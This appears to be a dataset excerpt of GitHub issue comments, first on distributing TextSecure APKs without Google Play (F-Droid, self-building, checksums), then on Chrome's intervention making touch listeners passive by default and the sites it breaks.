6676	"That's completely true, but it's a viable alternative as long as F-droid and Textsecure will not cooperate. I still believe F-droid is the way to go.
"
6677	"@rdsqc22: My build was successful, but I have no idea where the resulting APK is. Any clue? 
My assumption is that an APK should be the result, is that correct?
"
6678	"I believe that the reasoning here is that since Fdroid forces you to allow unknown app installations, that itself is a larger security risk than Gapps, in the hands of someone who does not know what they are doing. By forcing one to build their own app, this selects for the people who know what they are doing to be the ones to open that hole.

I believe I read somewhere that they would happily put it on Fdroid if it did not require unknown apps to be allowed.

@wiseoldman95  Your APK will be in ./TextSecure/build/apk/
You will have to self-sign TextSecure-release-unsigned.apk to install it.
"
6679	"@wiseoldman95: If you think of F-Droid as the main repository, sure. But I meant it as the software, with which you can set up a repo on your own. Even without a repo, you can use 'fdroid build' and 'fdroid install' to automate it.

@rdsqc22: True that ""unknown sources"" is required now, but a fix for that is currently in the works.
"
6680	"> I cloned the git repository and went from start to having a working, signed app in about 20 minutes. It was a great learning experience for me, and frankly, if you're the sort of person who's trying to have an Android phone without Gapps, you're probably computer competent enough to figure out how to spend a quarter hour building the APK, especially considering the quite thorough documentation.

My main problem with that approach is having to rebuild the app with every release, aka updating hassle.

> I believe that the reasoning here is that since Fdroid forces you to allow unknown app installations

You have to allow that in order to install self-built APKs as well.
"
6681	"True, I don't see the logic in abstaining from F-droid. It's leading to 3 possibilities, 2 of which are less secure, and the last one is less convenient:
1. Using another app.
2. Getting it from an unofficial source (And highly likely getting a malware)
   Lots of these can be found: https://www.google.com/#q=textsecure+apk
3. Building from source.
"
6682	"How about using things like NoGAPPS, GooglePlayDownloader or MicroG?

http://forum.xda-developers.com/showthread.php?t=1715375
http://codingteam.net/project/googleplaydownloader/download
https://github.com/microg/

I recently tried the Blankstore from NoGAPPS and it works like a charm. Does anyone have experience with the other two mentioned above?

----- Ursprüngliche Mail -----
Von: ""wiseoldman95"" notifications@github.com
An: ""WhisperSystems/TextSecure"" TextSecure@noreply.github.com
CC: ""jensschulz"" j.c.schulz@gmx.net
Gesendet: Dienstag, 6. Mai 2014 13:26:45
Betreff: Re: [TextSecure] Request: Google Play signed download alternative (#127)

True, I don't see the logic in abstaining from F-droid. It's leading to 3 possibilities, 2 of which are less secure, and the last one is less convenient: 

```
1. Using another app. 
2. Getting it from an unofficial source (And highly likely getting a malware) Lots of these can be found: https://www.google.com/#q=textsecure+apk 
3. Building from source. 
```

— 
Reply to this email directly or view it on GitHub .
"
6683	"+1
"
6684	"@jensschulz: Some people do not trust Google Play though.
"
6685	"@wiseoldman95 I haven't used Blank Store but at least with Raccoon or the APK Downloader app there is simple way of downloading an APK from Google Play without giving the Play Store strong permissions to install whatever it wants on the device. These apps work well as long as you use an Android ID corresponding to similar capabilities to those of the device you currently use. 

At least Google leave the signatures alone, unlike Amazon.
"
6686	"Since no Open Source download alternative to the shitty PlayStore exists, I strongly recommend everyone to use the awesome [APK Downloader](http://apps.evozi.com/apk-downloader/) - just paste the Package name or Google Play URL and directly download the latest APK to your device. Sad to see that TextSecure, an **Open Source** App, has not (yet) made it into a much more Open Source friendly store like [Fdroid](https://f-droid.org/). Still hoping for this to come.
"
6687	"Are the APK's distributed by Google digitally signed by the developers?
"
6688	"@wiseoldman95, yes, as to my knowledge they must be.
"
6689	"Heya! just a small remark: why don't you create an f-droid compatible repository we can add to f-droid client app? This would:
- allow you to still sign the apk with your key
- allow people to get updates automagically
- allow people who don't use gapps at all to have a convenient way to get OWS apks, without all the toolchain/build process

my 2cents.
"
6690	"@cjeanneret The reason for this is Fdroid forces you to allow apps from other sources, which opens up a huge number of possible security problems.
"
6691	"@rdsqc22 true, still offering this possibility would be nice, and keeps the app signature.

anyway, going to build some APK, as there are some updates for TS, Flock and others ;).
"
6692	"@rdsqc22 that is no longer true.  You can install FDroid as a system app, or let it use root, and it no longer requires ""Unknown Sources"" to be allowed.  This is true starting with FDroid 0.69-test, and will be included in the upcoming 0.71 stable release (any day now).
"
6693	"That's awesome @eighthave! Thanks! didn't realize.
"
6694	"Would anyone mind posting the latest version of TextSecure? I'm currently running cynanogen without gapps and didn't feel like installing them to upgrade. Thanks!
"
6695	"@countrygeek Do you have a Linux box? Then you could build it by yourself (it's not too complicated). Pls. contact me by mail if you need help (your github account has no e-mail address connected for direct feedback).
"
6696	"@countrygeek Without gapps you can't use push messages, you'll be only able to send encrypted and unencrypted SMS
"
6697	"@agrajaghh @countrygeek You _can_ use TextSecure without having an Google Play account. For some reasons, I can use my self-built version on all my phones and tablets without any problem. 

My devices however have Google Play Store installed, but as said, without an associated account ‒ the devices are not running CyanogenMod.
"
6698	"I think you don't need an google play account, but you need the google play services to be installed for push messages...
"
6699	"@agrajaghh wrote

> I think you don't need an google play account, but you need the google play services to be installed for push messages...

@countrygeek : yes
"
6700	"Currently TS doesn't work without gapps because it uses GCM as a push network. Take a look at #1000 to monitor the progress on websockets.

On 24. August 2014 15:47:06 MESZ, countrygeek notifications@github.com wrote:

> Would anyone mind posting the latest version of TextSecure? I'm
> currently running cynanogen without gapps and didn't feel like
> installing them to upgrade. Thanks!
> 
> ---
> 
> Reply to this email directly or view it on GitHub:
> https://github.com/WhisperSystems/TextSecure/issues/127#issuecomment-53193588
"
6701	"Thanks for the pointer on that thread @generalmanager :)

@countrygeek While it's not particularly helpful here, I find this helpful for getting apk's for essentials not yet on F-Droid. (You can install with `adb install /path/to/app.apk` if you have USB debugging set up.)

http://apps.evozi.com/apk-downloader/
"
6702	"@patcon : Thanks, I actually had tried using that but the site was down - appears up again now. It's definately the easiest way, vs. trying to get the ADT bundle up and running just to run TextSecure without Gapps. I have an unlimited data plan so I don't care about SMS charges. :)
"
6703	"I find it worrying that, to escape Google surveillance and profiling,
some are ready to install an apk downloaded from a service that don't
really offer security garantuees and that could compromise your device.

I think it really calls for a priority revision.

Find a way to do a checksum at least!
"
6704	"@Zeriuno this could be done by @Moxie on the release page https://github.com/WhisperSystems/TextSecure/releases see this → example https://github.com/schildbach/bitcoin-wallet/releases

<img src=""http://i.imgur.com/FKJUbP6.png"">

Moxie could simply additionally publish ‒ parallel to the publication in Google Play Store ‒ the release **apks** **_and_ their corresponding signature files** in the TextSecure https://github.com/WhisperSystems/TextSecure/releases page. Currently, there is only the source code. But there's no room for discussion, because AFAIK, he wants a secure channel for automatic updates, and only Google Play Store can do.
"
6705	"@Zeriuno I published checksums for versions < 2.0.8 on my TextSecure Wiki page https://github.com/Wikinaut/TextSecure/wiki/History-of-changes

This not-so-well-known gpg command/option lists all avaliable message digests:
`gpg --print-md ""*"" org.thoughtcrime.securesms.apk`
"
6706	"@Wikinaut: good!
"
6707	"I also vote for an **F-Droid repo** and a **alternative direct link which provide sha1 and gpg**. To publish it on the github release page would be also an interesting idea, we generally should as less as possible from google.
"
6708	"Where there is no transparency, there cannot be any hope of either security *or* privacy. Seeing a privacy application depend on nonfree software to function is therefor a very sad thing to me, as its dependences undermine its purpose. A system is only as secure/private as its least secure/private component, so anything that has Google Play Services installed is already compromised.

You also mention that a user has to enable third-party application installation to install outside the Google Play Store. While I'm not sure it will sway you, it's worth noting that for us Replicant users, we have to have that box unchecked to install anything outside of *F-Droid's* repository, meaning that by not offering it on F-Droid, you *require* us to enable third-party application installation.
"
6709	"@jtrig, maybe it's time to move on to more open alternatives like [Tinfoil-SMS](http://tinfoilhat.github.io/tinfoil-sms/)?
"
6710	"@SecUpwN No, because that's also not on Fdroid. Google Play only, so it's no better.
"
6711	"@rdsqc22, the developer of that App is extremely open to open source. Feel free to open up an Issue on his GitHub for that, I am sure this App will be available there sooner than you think.
"
6712	"@SecUpwN It looks like it used to be on Fdroid, but then got removed because the developer started using non-free binary blobs. https://f-droid.org/wiki/page/com.tinfoil.sms
"
6713	"Source, what is still limiting progress with this issue?
- ~~F-Droid allows nonfree apps, but will display a bold warning against them~~ I seem to be mistaken here, but  this still holds: (And TextSecure is implementing sockets instead of GCM anyway),
- F-Droid now allows to distribute a developer-signed version of the app, if the build is reproducable by their build server,
- F-Droid now allows installation of apps without enabling third-party support

In other words, **every single** of @moxie0’s complaints has been fixed, so why is this still not happening?
"
6714	"> In other words, every single of @moxie0’s complaints has been fixed, so why is this still not happening?

Maybe just because no-one told him yet ;-)

I guess distributing TextSecure on F-Droid while Google Play Services are still required for it to run doesn't make too much sense. You could check out #1000 resp. the fork at https://github.com/JavaJens/TextSecure to help with that.
"
6715	"> F-Droid now allows to distribute a developer-signed version of the app, if the build is reproducable by their build server

Interesting. Could you point me to some information / docs on how this is supposed to work?

> In other words, every single of moxie0’s complaints has been fixed

I don't think there is a solution for automated crash reporting without Google Play yet.
"
6716	"@brumsoel See https://f-droid.org/wiki/page/Deterministic,_Reproducible_Builds. For background on reproducible builds in general, see e.g. this [talk at the 31C3](http://media.ccc.de/browse/congress/2014/31c3_-_6240_-_en_-_saal_g_-_201412271400_-_reproducible_builds_-_mike_perry_-_seth_schoen_-_hans_steiner.html) ([slides on this page](https://events.ccc.de/congress/2014/Fahrplan/events/6240.html)).
"
6717	"The reproducible build stuff is quite new and still a bit raw, but it does work.  I'm happy to help get TextSecure integrated using this process for anyone who wants to take it on.

As for automated crash reporting without Google Play, you can use [ACRA](http://www.acra.ch/) then choose which backend you want it to upload to.
"
6718	"This is now available here: https://signal.org/android/apk/

I don't recommend that people do this, but we've set this up as a harm reduction strategy since people are already running random APKs signed by other random people instead."
6719	"/cc @tdresser @dtapuska who are working on the engineering in chromium for this.
"
6720	"Note that we're thinking that this will start by applying only to cases where `passive` isn't specified like: `addEventListener(""touchstart"", handler)`.  That would then behave differently from `addEventListener(""touchstart"", handler, {passive:false})`.  But this would be more of a migration strategy / hint than behavior we'd expect to keep long term (i.e. if CNN made their touch listener `passive:false` for some reason without fixing the jank, we'd still want to intervene on the user's behalf).  So I don't think that distinction would ever really belong in the DOM spec.  /cc @annevk @smaug---- @jacobrossi, thoughts?
"
6721	"If we start doing something like this, then it isn't clear to me at all anymore why we'd need 'passive'. 
Especially given that there is touch-action and such.
"
6722	"Interventions are primarily about improving the user experience at the expense of some developer rationality.  A core part of the [guidelines](http://bit.ly/user-agent-interventions) is that if developers follow best practices, they will never be impacted by an intervention.  This lets us generate warnings / metrics around intervention triggering and drive them down as a thing to avoid.  We can't do any of that without an explicit API where developers can opt-in in a rational manor to `passive` behavior.
"
6723	"Quick update:
- The most promising change here seems to be to treat touch listeners on `window`, `document`, `document.documentElement` and `document.body` as passive by default ([spec issue](https://github.com/w3c/touch-events/issues/74)).
- Chrome [has shipped](https://bugs.chromium.org/p/chromium/issues/detail?id=639227#c8) the above behavior to 50% of dev-channel users and saw a 50% reduction in scroll start time at the 95th and 99th percentiles, without any reports of substantial breakage.
"
6724	"Have you considered other options here, since this kind of change would make the platform less coherent internally and would add yet more special cases to the already complicated platform?
Like, a browser could have a ""performance hint console"" to tell to the web developers that whatever they are doing is probably slowing down ux and what they could do instead is <explanation1> and if they want to keep the existing behavior but don't see the warning again do <explanation2>.

I'm rather worried that if we end up adding more and more ""interventions"", we end up polluting the platform with tons of small hacks and inconsistencies, and such things tend to beat us later, when designing new APIs or spec'ing how the platform works.
"
6725	"Yeah I'm worried about this too.  We've long had devtools features highlighting scroll performance problems, and in general we've found they're helpful for developers motivated around perf, but when our goal is to improve the 95th percentile latency for users they're nearly useless (developers looking at perf in devtools are generally well below the 95th percentile, it's the sites where nobody is even measuring that matter most to the 95th percentile).

Long term ideally I think we'd aim to make touch events universally passive by default (basically the same way pointer events are, but with an opt-out if you really want it).  That, I think, would be clean / rational from a web developers perspective.  WDYT?  Of course we'd need some transition path over many years to avoid breaking the web too badly in order to get there.  
"
6726	">  it's the sites where nobody is even measuring that matter most to the 95th percentile.

And your solution is adding hacks to the browser that affect every website everywhere and which can and _do_ (note the referenced PhotoSwipe issue) suddenly break previously perfectly valid code which is intercepting touch events at the document level for anything as basic as page-wide drag&drop.

Here's a suggestion: put these hijinks behind a switch that devs can turn _off_ with a `<meta content=""back-the-hell-off""/>` tag, so there is an escape hatch until third-party libraries can catch up.
"
6727	"The idea here is that web sites could explicitly use non-passive listeners by passing the right kind of dictionary to addEventListener.
But I agree, this kind of changes are a bit web dev hostile, which is why I was wondering if other mechanisms have been investigated to improve the ux of pages. Sounds like no.
"
6728	"The PhotoSwipe code is setup to use PointerEvents but they are using the proprietary detection mechanism so when Chrome ships pointer events (M55) and FireFox does later this year it wouldn't take advantage of them.

meta tags are difficult for libraries to override set. So the escape hatch here is to provide a fully defined value. But really in this case it should be switched to use pointer events as it would be more efficient.
"
6729	"> And your solution is adding hacks to the browser that affect every website everywhere and which can and do (note the referenced PhotoSwipe issue) suddenly break previously perfectly valid code which is intercepting touch events at the document level for anything as basic as page-wide drag&drop.

Yep, that's the nature of interventions: make the experience substantially better for a LARGE number of users at the cost of some small compat / developer pain cost. There's definitely a legitimate concern here about striking a good tradeoff, but in general the user experience has gotten so bad on the mobile web (putting the entire platform at such risk of economic collapse) that I don't think anyone involved really believes the right tradeoff is to land entirely on the side of developers over users.  Our (Google web platform team's) thinking on that is mostly summarized [here](https://github.com/WICG/interventions/blob/master/README.md) and yes it definitely includes that developers should usually have a way to opt-out (as they do in this case).

But note that if you're already following best practices (eg. making your site work correctly with touch on Microsoft Edge) then you'll already have a `touch-action: none` rule in such case and your site will continue to work fine.  Even if you don't, it's likely your site will still work ok (eg. if it's really a full screen drag and drop then the page won't be scrollable).  Specific counter examples appreciated, making the ideal tradeoff is challenging.
"
6730	"And just to make sure we're all clear on the benefit - we're talking about giving all users the experience on MANY major websites seen on the right of this video: https://www.youtube.com/watch?v=NPM6172J22g.  Given the huge positive response that video has gotten from users, we're willing to accept a little bit of hacks / compat pain here.
"
6731	"> meta tags are difficult for libraries to override set.

Hence the libraries will have to fix their problems. A meta tag switch would be an escape hatch for developers depending on third-party libraries that have not been updated yet.

>  developers should usually have a way to opt-out (as they do in this case).

They're effectively stuck until all the libraries their project relies on, update to handle what is essentially a breaking change in their years of handling touch events.

Complex touch event scenarios are a [[censored]] nightmare hellscape. And now you're saddling devs with either switching to a different library (with its own potential weaknesses) or forcing them to dive into the guts of those libraries themselves to sort it out. If you call that a viable opt-out, you're _mad_.

---

Besides: do you know what the easiest way is to patch those issues? You override whatever abstraction for `addEventListener` the library uses to detect passive event listener support and include a `passive:false` that is hardoced for all events and which gives Chrome the finger. Road of least resistance. Road of least cost. And a road which ends in a status quo that is atleast known to work _correctly_, even if it performs worse.

Guess what solution companies that are already not interested in performance are going to use?
"
6732	"In this case, developers don't need to wait for libraries to update, they can apply touch-action to the parts of their page that should prevent scrolling.
"
6733	"> In this case, developers don't need to wait for libraries to update, they can apply touch-action to the parts of their page that should prevent scrolling.

In many complex interaction cases touch-action needs to be applied and unapplied _dynamically_, determined by the user's interaction state with various parts of a UI. That interaction state may well be _under the control of a third-party library_ that is used to render part of the UI; or that implements an abstraction on top of touch events for complex user gestures that a UI requires.

So please explain again why you believe developers wouldn't need to wait for libraries to update, because there certainly are plenty of cases where they _will_...
"
6734	"> And just to make sure we're all clear on the benefit - we're talking about giving all users the experience on MANY major websites seen on the right of this video: https://www.youtube.com/watch?v=NPM6172J22g. Given the huge positive response that video has gotten from users, we're willing to accept a little bit of hacks / compat pain here.

In my opinion, It should be the responsibility of those major websites to update their code to opt-in to _new_ browsers features.  If these websites are major, then they can certainly afford the dev resources to do so.

It's my understanding that a large part of the spirit of the web is that backwards compatibility is baked-in.  Have a really old page from 1996?  It should still work.  Have a new webapp in 2017?  That should work too.

This change can _break_ pages and webapps that rely on touch events for the benefit of making sites with video, like CNN, faster.  I don't think it's a fair trade-off to put speed over correctness --- regardless of how nice the speed is.

Please reconsider making this an opt-in feature rather than an opt-out one.  The feature itself is a good idea, but I strongly disagree with changing well-established, default behaviour."
6735	@maxkfranz that's an argument against all interventions, not just this one.  There's legitimate debate to be had here, but let's keep it to #43 rather than spread across each individual intervention issue.
6736	"Why?

Why change the API like this?

It would be OK if availability of the object form of third argument was sniffable, but it's not. We can't know when to pass `{passive: false, capture: useCapture}` or just `useCapture`

So we can't prevent touchstart events from blurring by calling `preventDefault`.

 (╯°□°）╯︵ ┻━┻
"
6737	"You can feature detect, to determine whether to pass the third argument an object (though it's a bit clumsy).

See the EventListenerOptions [explainer](https://github.com/WICG/EventListenerOptions/blob/gh-pages/explainer.md#feature-detection)."
6738	"Though hopefully it's exceedingly rare to need to opt-out of passive touch listeners.  `touch-action` is the simplest work-around in 99% of use cases.

Also the exact API design came from months of contentious standards debates - see [here](https://github.com/WICG/EventListenerOptions/issues?utf8=%E2%9C%93&q=is%3Aissue%20) and the other links [here](https://github.com/WICG/EventListenerOptions/blob/gh-pages/README.md) for most of the history if you really want to know ""why"" the EventListenerOptions API has the design it does."
6739	"@tdresser Yes, you can feature detect.  But feature detection is useful only if you can change *all* affected code in your app.  

If you're the only one using listeners, then you're OK.  If you're using a lib that uses the `addEventListener()` function and it doesn't have a workaround specifically for this deviation from previous, standard behaviour, then you're really stuck.

@RByers [To quote a previous comment about this](https://github.com/cytoscape/cytoscape.js/issues/1702):  The main concern regarding Cytoscape is that the lib is used in many places, in both academia and commercial organisations, not all of which can easily update their code. Having support for passive events in Chrome is great but unfortunately, changing the default behaviour breaks our lib and many apps that depend on it.

I notice the following issue by @RByers in particular: https://github.com/WICG/EventListenerOptions/issues/38.  That seems much more sensible to me.  Disabling `preventDefault()` (i.e. `passive: true`) for touch events should be opt-in, and a separate lib can facilitate making `passive: true` default just as you describe --- without breaking existing apps."
6740	"> If you're using a lib that uses the `addEventListener()` function and it doesn't have a workaround specifically for this deviation from previous, standard behaviour, then you're really stuck.

I mentioned the same thing before. But for some reason some Google engineers seem to be deaf to this genuine software compatibility problem and live in a la-la land where developers have the luxury of being able and allowed to fork and patch any such library they're stuck using.

I don't terribly mind that passive would be the default behavior, but at the very least we need an easy one-shot method of **turning this intervention off when compat problems arise**."
6741	"> I don't terribly mind that passive would be the default behavior, but at the very least we need an easy one-shot method of turning this intervention off when compat problems arise.

I think you have good intentions here:  New apps you are making or apps you have direct control over could use a method like you propose.  

My opinion is that's not enough, because apps or sites that won't be updated would still be broken.  I don't think that's a fair trade-off."
6742	"> My opinion is that's not enough, because apps or sites that won't be updated would still be broken. I don't think that's a fair trade-off.

Then perhaps Google should themselves maintain a white-list of websites on which this intervention could be enabled and disable it for all others.
"
6743	Thanks for the feedback. Most of these comments apply to interventions in general. As rbyers@ commented above, there's legitimate debate to be had here, but let's keep it to #43 rather than spread general feedback about the interventions across each individual intervention issue.
6744	"Since it's specific to the history of this issue, I'll re-iterate what I [said on the Chrome bug](https://bugs.chromium.org/p/chromium/issues/detail?id=639227#c27) here:

I'm deeply sorry for the frustration this has caused you.  We've long tried the ""opt-in"" approach but have learned that on average developers don't make the effort to opt-in to better performance.  In particular, in this case we started pushing passive touch listeners heavily [back in June] (https://developers.google.com/web/updates/2016/06/passive-event-listeners) including during the Google I/O Chrome keynote, and outreach to a large number of frameworks and other major sites would we knew could benefit.  They almost all told us ""can't you just detect this and do it for me automatically so I don't have to change my code?"".  As you can see in the graph [here]( https://developers.google.com/web/updates/2017/01/scrolling-intervention), we've had very little impact on real-world scroll performance via the ""opt-in+outreach"" approach.

So we believe that when only tiny number of sites are negatively impacted, and a huge number are positively impacted, we should prefer a ""fast by default"" policy instead.

We've done our best to do this in a responsible way - in discussion with all the browser vendors and standards groups, with an easy fix (touch-action), a full opt-out (though I admit it's not exactly easy), console warnings,  developer outreach, and careful roll out via trials, dev and beta channel where were heard very little complaints.  We need to work harder at this - eg. see #44.  But in Chrome we're fundamentally unwilling to allow the mobile web to continue to die from performance bankruptcy.  Other browsers are less aggressive, and people who prefer to be more conservative (preferring maximal compatibility over being part of moving the web forward aggressively) should prefer to use a more conservative browser."
6745	"Unfortunately very few people outside the browser development community have any interest in watching keynotes etc - and something like this is very abstract until it comes into effect.

Among other things, this completely breaks the ability of Chrome to be used to test mobile sites as it is completely non-standard behaviour that destroys any possibility of testing web apps without using something like BrowserStack etc.

The way this appears to a web developer:

1. Bad websites take too long within touchstart events (without calling `.preventDefault()`) as the `options` parameter isn't supported in IE (assuming they even know about it), and don't want to use timer/rAF callbacks. End result is that initial touch scroll is delayed by a noticeable amount of time.
2. Good websites / webapps want to prevent mobile scrolling so call `event.preventDefault()`.

Possible solutions:

1. Log warnings on websites that take too long (and possibly don't call `preventDefault`).
2. Pop up an `alert()` style box for websites that do this (actually give some incentive to these popular sites such as in that video etc).
3. Change things in an incompatible way (please explain how to use `useCapture` in a compatible manner without access to `options`) breaking webapps and websites that want to work on IE / Edge.

With this solution there's no incentive for sites to fix things. There's no pressure on MS to support `options` (even though I'd love to be able to use it, having to support older browsers means it's ~3 years or more away if they added support today). Older websites and apps are oing to break and users will have no clue why - the log spam will help developers - but that's assuming that there's a developer around to fix things.
"
6746	"> But in Chrome we're fundamentally unwilling to allow the mobile web to continue to die from performance bankruptcy. 

Yet you are not opposed to letting the weaker underbelly of sites on the web die out by willfully breaking those sites without anyone being available (or able) to fix them? Sites that might not even _have_ performance issues, even..."
6747	@rjgotten I think the sites they're going to break are the ones that call `preventDefault()` in there - and almost by definition they won't have any performance issues to begin with...
6748	"@Rycochet 
Good point. Makes this decision all the more disturbing.

"
6749	"We know from metrics we've collected from the wild that the vast majority of touch listeners don't call `preventDefault`, and of those that do, the majority do so intermittently in ways we can't predict.  Eg. it's common for a touch listener on the `document` to use jQuery event delegation such that `preventDefault` gets called only when the `touchstart` occurred over some element.  In most of the cases where `preventDefault` would be called, the page isn't scrollable anyway so there's little visible breakage to scrolling not being disabled.

Can you give us the URLs of some sites that are seriously broken by this?  I assume it's the specific change in #35 that we're talking about here.  Over 15% of Chrome Android users now have that change and we've received almost no complaints from users about sites being broken.

It's definitely possible that we've made the wrong choice (the tradeoff between advancing the web and maintaining full compatibility is a constant challenge for all browser - we all expect to make some mistakes in both directions).  But after [years](https://docs.google.com/document/d/1E16tmoOveGopys9Fx4Nn8x8P9q7Jm6CJIqoJyz31tlg/edit#heading=h.ofvbijlpx0iv) of [debate](https://groups.google.com/a/chromium.org/forum/#!searchin/blink-dev/""passive""$20document/blink-dev/BW3qrkisqIs/v5Au-HVTAwAJ) on this sort of thing, we're far enough along that abstract arguments aren't particularly helpful.  As this stage, the main things that could convince me that we've made the wrong decision for the web at large (rather than just for a tiny number of developers/sites who are personally impacted) are some or all of:

1. If a large number of users filed/starred bugs providing URLs of sites that are broken.  Eg. [here's an example](https://bugs.chromium.org/p/chromium/issues/detail?id=669800) where we learned from users that (despite very promising metrics) our decision was wrong.
2. We found some badly broken library/pattern that we can see (eg. via HTTP Archive) is highly prevalent on the web.  Eg. see [this issue](https://bugs.chromium.org/p/chromium/issues/detail?id=501568) where I've been holding back from fixing an [annoying interop bug](https://bugs.chromium.org/p/chromium/issues/detail?id=157855) for years because 0.3% of top websites use a bad library that causes scrolling to break when the bug is fixed.
3. An outpouring from many web developers arguing we're doing the wrong thing.  I'm actually shocked that I can't find a single [complaint on Twitter](https://twitter.com/search?f=tweets&q=chrome%2056%20android%20scrolling&src=typd) about this, in contrast to [some other interventions](https://twitter.com/search?q=document.write%20chrome&src=typd) which have still been judged to be worth the cost overall.
4. Evidence from users that the benefit we're achieving isn't actually all that important to them.  So far we've gotten a [ton of feedback that users care about this](https://twitter.com/RickByers/status/719736672523407360).
5. Examples of use cases where it's really impossible or unreasonably burdensome to fix sites to account for the new behavior.  The ""some sites can just never be updated at all"" argument doesn't carry much weight with me because the only way to fully accommodate such sites on the web is to stop changing browsers at all (including stopping fixing browser bugs).  [Here's](https://github.com/WICG/interventions/issues/25) a recent example where we relaxed an intervention after feedback only from a single developer that a legitimate use case had become impossible.

I'm sure we're going to see more of the above over the next couple weeks (I'm shocked to have not seen more already).  But as you can see from the other examples, we're definitely paying attention to this sort of feedback and will course-correct if necessary.  But we're determined to be thoughtful and disciplined about the global tradeoffs here, not make rash strategically impactful decisions based on the vehemence of a few individuals."
6750	"The change has been made globally on desktop and mobile, only affecting touch events, so the metrics are only useful for people leaving them on (most developers I know turn them off specifically). Where desktop machines are getting more touch capable that means the machines with the processing power to not have any performance issues are still having this change (unfortunately I fully understand that any change has to be universal). This also means that the DevTools device emulation also has this change - which is where I found out about it trying to test a site using FabricJS (which looks like it would need to get a cross-browser fix, and the css `touch-action` fix is not possible as it's a library, so it would need to use browser-detection for consistent behaviour).

Unfortunately I can't personally provide URLs to any sites that I've developed hitting on this as they're education sites for Collins, Hodder and a couple of other smaller publishers (fortunately Pearson didn't need anything like this) - and all the content is under NDA and/or behind school portals that need access through their own sites directly. Currently that stands at ~10k individual sites (ie, not using shared JS/CSS files that can be easily fixed in one place).

I can say that the specific uses for this are for paged displays (not unlike book page turning with swipe etc), and for delegated dragging events - especially global ones via React, where you either attach to every element, or delegate and only attach to the top (might not be perfect, but 1x delegated handler can be far easier to manage than 100x direct handlers)."
6751	"As someone who only stumbled across this via a tweet and only occasionally does web development... I'd flip tables if this goes through and breaks an old page of mine(Because as someone has said backwards compat is one of the key features of Web). However, my biggest issue with it is inconsistency between browsers. It seems like RByers is very gung-ho over this change, but I'd argue that loading a popup to the user stating ""We're sorry, this site's scrolling is slow due to them not following best practices, please report the issue to the site."" would do enough to shame most major sites into fixing their code... while never breaking old sites. "
6752	"@mawalker Something like this pseudo-code - `if (timeTaken > 100ms) { (defaultPrevented ? console.log : alert)("" ... "") }`"
6753	"Basically yes... However... honestly, I don't know if that would be 'good' to do or not... I know it is a bit of a heavy handed approach that some might think goes too far in (annoying) Alerting the user. But it would at least not break any sites and would promote sites (devs) to follow the best practices(Because they wouldn't want their site to get that annoying alert+have visitors complain to them about it). 

I started to write this thinking that it might not be the best approach but after further thinking... since there is no -need- for the intervention (since a best practices work around already exists) I think it would be the better part of valor to not move ahead with the intervention and instead use discretion and fall back to an alert for slow scrolling sites(and if you don't want to alert users, then put into console.log the warning message explaining the site UX lag. This wouldn't notify most users but would let devs know what is the root cause(I'd put link to page explaining issue in console log to further help newbie devs (such as myself))). "
6754	@rbyers, ignoring whether or not it may be performant or difficult to do so, would it be possible to do some type of static analysis (or limited dynamic analysis) when a non-passive touch listener is bound to check if the Event Object is preventDefault'ed or passed to another function, and if so, assume preventDefault will happen? 
6755	"Improving the performance of the web is a worthy goal. However, breaking APIs and going against spec to get there seems misguided, IMO. Chrome ""interventions"" (breaking changes to the most widely used implementation of the web platform) are an immensely strong tool and should be used sparingly.

In this case and with the knowledge I've got, forcing passive on scroll-related events by default seems like a misstep. I'm going to keep this comment focused 100% on the intervention at hand.

Passive event listeners were added to Chrome in June. It has been less than a year since they appeared, and the API still isn't supported by Edge or iOS Safari ([caniuse](http://caniuse.com/#feat=passive-event-listener)). I can sympathize with the comment:

> average developers don't make the effort to opt-in to better performance

[source](https://github.com/WICG/interventions/issues/18#issuecomment-278658295)

But that alone isn't enough of a reason to break existing sites. Indeed placing the blame for the lack of passive event adoption at the feet of lazy developers is not a productive way to approach the problem. A developer might not have adopted passive events listeners for many valid reasons:

* The developer isn't aware of the feature. Again, passive events came to Chrome in June. **By October an [intent to intervene](https://groups.google.com/a/chromium.org/forum/#!searchin/blink-dev/%22passive%22$20document/blink-dev/BW3qrkisqIs/v5Au-HVTAwAJ) was already opened.** How quickly were websites and libraries supposed to take up this new API for the adoption rate to be acceptable? I say this as someone who contributed to [a library that uses the API](https://github.com/rwjblue/ember-lifeline). IMO, 4 months was never going to be enough time to get lots of websites to adopt this. I expect most developers still don't know the feature exists.
* The developer is working on something else, like feature work. Seems valid.
* The developer has prioritized other performance work where it has a greater impact on their application. Performance is multi-faceted (initial load, JS execution speed etc), and you invest where it has greatest relevence to your users.
* The developer doesn't know they are using active event listeners because they use them through a library or other interface. This definitely applies to ""average developers"", most of whom build on top of higher level tools.
* *There is no developer*. Some software is written and handed off to a business, and there isn't an interested party at hand to advocate for this change.

There are a number of ways these issues would be addressed:

* More evangelizing.
* Warnings in the console (without breaking changes).
* Warnings in devtools (as Chrome shows w/ forced layout)
* Contributing to libraries, adapting them to the new APIs

None of these things is as exciting as an intervention. All of them maintain the stability of the web platform, which is one of its most important assets.

Measuring the impact of an intervention definitely seems hard. In the [Intent to Intervene](https://groups.google.com/a/chromium.org/forum/#!searchin/blink-dev/%22passive%22$20document/blink-dev/BW3qrkisqIs/v5Au-HVTAwAJ) email there are a few stats, like the fact that 2% of dispatched events are potentially affected. There is lots of discussion about tracking breakage, but no real numbers shared.

After a small amount of investigation **I can share a few things I know are broken today**.

* Gmail, when resizing an image. [video](https://monosnap.com/file/gSg5TM9LAnbBW4RGFlvxXOGHEPLnIA)
* Google Analytics, when dragging segments around. [video](https://monosnap.com/file/J7O9uI2rG1zx3ECCs3Pum4cUATiINq)
* The [ember-sortable](http://jgwhite.co.uk/ember-sortable/demo/) library, and so probably also most mobile web apps built on it. [Fix in progress](https://github.com/jgwhite/ember-sortable/issues/130). [video](https://monosnap.com/file/3VjFc79O6a2kd2mNPd1YvsDqa9TWzT)
* [Kendo UI](http://demos.telerik.com/kendo-ui/dragdrop/index), at least the version on their demo pages. [demo](https://monosnap.com/file/BDpa3y65pchtwtR2BSxUyCq7xDZCAK)

It seems likely that a lot of sites involving drag/drop and the mobile web are negatively impacted. Not all, but many.

> Why isn't touch-action: none sufficient to set on the the sortable-items css to fix the ember sortable issue?

[source](https://bugs.chromium.org/p/chromium/issues/detail?id=639227#c29)

`touch-action: none` isn't sufficient because this not only impacts me as a developer, **it impacts me as a user**. I cannot fix Gmail, that is certain.

> So we believe that when only tiny number of sites are negatively impacted, and a huge number are positively impacted, we should prefer a ""fast by default"" policy instead.

[source](https://bugs.chromium.org/p/chromium/issues/detail?id=639227#c27)

